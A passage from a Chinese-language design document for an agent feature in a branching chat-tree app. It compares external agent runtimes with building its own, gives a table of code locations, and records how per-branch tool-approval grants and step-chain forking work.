- **会话状态在 kimi 那边，不在 chatable 的树里。** 能做的分叉只有 `kimi fork`（复制**整个**会话），没法「从第 7 步分叉」：上下文是 kimi 自己管理和压缩的，chatable 不能重建任意前缀，也就享受不到前缀共享缓存。
- 步骤和检查点粒度由对方决定，树只能当作外部会话的**只读投影**，「回滚到任意 step 然后改一句话重来」做不到，或者只能靠文件快照加一个新会话近似。
- 模型被绑定成 Kimi 订阅（或者它支持的 provider），chatable 现在「任意 OpenAI 兼容模型」的灵活性没了；登录态和计费都在外部。
- 依赖外部 CLI 的版本：协议细节、ACP 能力随版本变化，排错链路也长。
- 安全边界在别人手里：它的 `--auto` 模式加上 chatable 的 web 内容，污染策略很难强制执行。

### 方案 Y：Claude Agent SDK（Python/TS）
- 优点：最成熟的 agent 运行时（工具、权限回调 `can_use_tool`、hooks、子 agent、会话续接和 fork）。
- 缺点：基本上只能用 Anthropic 模型（或者兼容的端点），跟你现在以 DeepSeek 为主的成本结构冲突；会话一样是线性的，不能任意中间分叉；还要外部 runtime（Claude Code CLI）。

### 建议
**主线自建（P0 到 P5），外部 agent 作为 P6 的补充节点类型。** 理由：
1. 你想要的差异化，「思维导图树 + agent」，本质是**每一步都是一等公民节点**：能分叉、能回滚文件、能对比、共享前缀缓存。这需要掌控 agent loop 和上下文组装，而这两样现有代码已经做了七成（`_generate_unified` 加 `_expand_path` 加 `build_context` 加 `_LiveTurn`）。
2. 只做「编辑文件 + 跑命令」，自建的工作量其实可控：工具层大约 1500 行，难点在快照和审批，不在 agent 本身。
3. 外部 agent 适合「把一个明确子任务整个外包」的场景，比如「在这个 worktree 里把测试修绿」。把它当成树上一个可展开的黑盒子树，正好发挥它的长处，也不牺牲树的语义。

**如果只想先最快体验一下：** 可以先花大约 1 到 2 天做一个 P6 的简化版，ACP 接 kimi，把它的输出渲染成只读 step，借此验证交互设计（审批卡片、思维图上 step 怎么显示）。但核心架构还是按 P0 到 P2 推进，别把外部会话当成树的主存储。

---

## 附：关键代码位置速查

| 主题 | 位置 |
|---|---|
| 节点结构 | models.py:9-26 |
| 追加写 / 一次性落盘 / 路径 | jsonl_store.py:277 / :411 / :538 |
| 后台 turn 和 SSE 缓冲 | service.py:118-213, :1672-1775 |
| 统一工具循环 | service.py:1781-1983（上限 :51, :1888；去重 :1879-1887；执行 :1929；停止补 stub :1966） |
| 结束落盘（tool_results/tool_messages） | service.py:1985-2037 |
| 回放展开 | service.py:1565-1607；`_live_context` :1609 |
| 上下文截断 | main.py:916-969（80/24：:367-368；摘录 :801） |
| 模型流式 | main.py:1028, :1126 |
| 工具注册（未使用的 read_only） | tools.py:21-27, :176 |
| 附件白名单 | web_tools.py:612-651 |
| 安全中间件 | server.py:137；send/stream/stop :538-581；fs/list :583 |
| 前端工具渲染 / Fork 栏 / 思维图 / SSE 分派 | index.html:337 / :459 / :721, :2535, :2581 / :3353 |

---

## 附：实现阶段的偏离与补充（P0–P4 落地后记）

以下为原型实现中相对上文设计做的两处行为决策，随 v 系列迭代确定：

- **跟随发言挂在 step 链尾。** 在 agent 会话里，从某条 assistant 回复继续提问时，新的 user 节点挂到该回复 step 链的末尾（而不是 assistant 节点本身）。效果：①分支上已批准的 "always allow" 授权（记录在授予它的 step 节点上、只对其后代生效）能沿轨迹传递；②上下文保持完整（整段 replay + 最终答复）。工作区恢复仍按 assistant 节点自身的最终快照计算（即整轮结束时的状态）。**从 step 中途分叉**则是另一回事：replay 在该 step 处截断、丢弃最终答复，并注入"从第 k 步继续、工作区已回滚"的系统提示。
- **授权按分支生效。** "Always allow" 记录在执行该调用的 step 节点上（内存中，重启后失效），审批判定时从当前位置沿 path_to_root 向上找：只有祖先或自身节点上的授权才生效。从授权点之前分叉会重新询问。`GET /api/agent/approvals?node=` 返回该位置的有效授权及来源；reset 只清当前路径上的授权。
